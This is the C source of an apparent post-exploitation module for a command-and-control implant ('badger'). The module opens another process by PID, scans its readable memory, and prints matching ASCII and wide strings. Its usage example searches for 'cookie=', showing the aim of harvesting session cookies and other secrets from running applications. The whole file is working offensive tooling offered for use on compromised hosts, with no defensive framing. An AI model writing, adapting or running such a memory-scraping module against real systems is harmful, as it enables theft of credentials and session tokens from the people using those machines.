#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "../badger_exports.h"

DECLSPEC_IMPORT int Kernel32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT HANDLE Kernel32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT DWORD Kernel32$GetLastError();
DECLSPEC_IMPORT SIZE_T Kernel32$VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
DECLSPEC_IMPORT BOOL Kernel32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT BOOL Kernel32$CloseHandle(HANDLE hObject);

DECLSPEC_IMPORT int Msvcrt$iswprint(wint_t _C);
DECLSPEC_IMPORT int Msvcrt$memcmp(const void *_Buf1, const void *_Buf2, size_t _Size);

PVOID FindNonUnicodeChar(WCHAR *input) {
    while (*input) {
        if (!Msvcrt$iswprint(*input)) {
            return (PVOID)input;
        }
        input++;
    }
    return NULL;
}

WCHAR* ConvertToWideChar(char *input) {
    WCHAR* output = NULL;
    SIZE_T outputLen = Kernel32$MultiByteToWideChar(CP_UTF8, 0, input, -1, NULL, 0);
    if (! outputLen) {
        BadgerDispatch(g_dispatch, "[-] Error wchar conversion 1: %lu\n", Kernel32$GetLastError());
        return NULL;
    }
    output = BadgerAlloc(outputLen+1);
    if (Kernel32$MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputLen) == 0) {
        BadgerDispatch(g_dispatch, "[-] Error wchar conversion 2: %lu\n", Kernel32$GetLastError());
        BadgerFree((PVOID*)&output);
        return NULL;
    }
    return output;
}

void SearchMemory(HANDLE hProcess, char *search_string) {
    WCHAR *wsearch_string = ConvertToWideChar(search_string);
    if (! wsearch_string) {
        return;
    }
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char *buffer;
    SIZE_T bytesRead;
    SIZE_T searchLen = BadgerStrlen(search_string);
    for (LPVOID addr = 0; Kernel32$VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) == sizeof(mbi); addr = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_READONLY)) {
            buffer = BadgerAlloc(mbi.RegionSize);
            if (Kernel32$ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead)) {
                for (SIZE_T i = 0; i < bytesRead - searchLen; i++) {
                    if (Msvcrt$memcmp(buffer + i, search_string, searchLen) == 0) {
                        BadgerDispatch(g_dispatch, "[c] Char string  (0x%p): %s\n", (PVOID)(buffer + i), (CHAR*)(buffer + i));
                    }
                    if (Msvcrt$memcmp(buffer + i, wsearch_string, searchLen*2) == 0) {
                        SIZE_T sizeOfStr = 0;
                        WCHAR *stringStart = (WCHAR*)(buffer + i);
                        PVOID stringEnd = FindNonUnicodeChar(stringStart);
                        if (stringEnd) {
                            sizeOfStr = (stringEnd - (PVOID)stringStart);
                        } else {
                            sizeOfStr = BadgerWcslen(stringStart) * 2;
                        }
                        WCHAR *finalString = BadgerAlloc(sizeOfStr + 2);
                        BadgerMemcpy(finalString, stringStart, sizeOfStr);
                        BadgerDispatch(g_dispatch, "[w] Wchar string (0x%p): %ls\n", (PVOID)(buffer + i), finalString);
                        BadgerFree((PVOID*)&finalString);
                    }
                }
            }
            BadgerFree((PVOID*)&buffer);
        }
    }
    BadgerFree((PVOID*)&wsearch_string);
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
    if (argc < 2) {
        BadgerDispatch(dispatch, "[!] Usage: mem_search.o <pid> <string to search>\n[!] Eg.: mem_search.o 8112 \"cookie=\"\n");
        return;
    }
    DWORD pid = BadgerAtoi(argv[0]);
    CHAR* scanString = argv[1];
    HANDLE hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (! hProcess) {
        BadgerDispatch(dispatch, "[-] Error opening process: %lu\n", Kernel32$GetLastError());
        return;
    }
    BadgerDispatch(dispatch, "[*] Scanning process Id: %lu\n[*] Search string: '%s'\n-------------------------------\n", pid, scanString);
    SearchMemory(hProcess, scanString);
    Kernel32$CloseHandle(hProcess);
    BadgerDispatch(dispatch, "-------------------------------\n[*] Search complete\n");
}
